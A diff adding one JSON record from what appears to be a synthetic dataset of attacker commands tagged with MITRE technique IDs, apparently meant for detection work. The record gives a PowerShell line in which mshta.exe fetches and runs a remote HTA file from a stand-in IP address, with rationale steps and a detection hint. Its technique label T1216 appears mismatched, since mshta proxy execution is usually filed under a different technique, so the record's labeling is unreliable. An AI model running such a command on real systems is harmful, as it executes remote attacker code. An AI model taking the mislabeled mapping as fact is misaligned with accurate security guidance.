@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "mshta.exe http://203.0.113.44/portal.hta",
+  "explanation": "Executes a remote HTA application via the signed mshta host as a proxy, a classic system script proxy pattern under user context.",
+  "rationale_steps": [
+    "From PowerShell, start mshta pointing to a remote HTA over HTTP/HTTPS.",
+    "mshta retrieves and runs the HTA content without requiring elevated privileges.",
+    "Detection should focus on mshta with remote URLs and non-interactive invocation patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-1903ec35",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
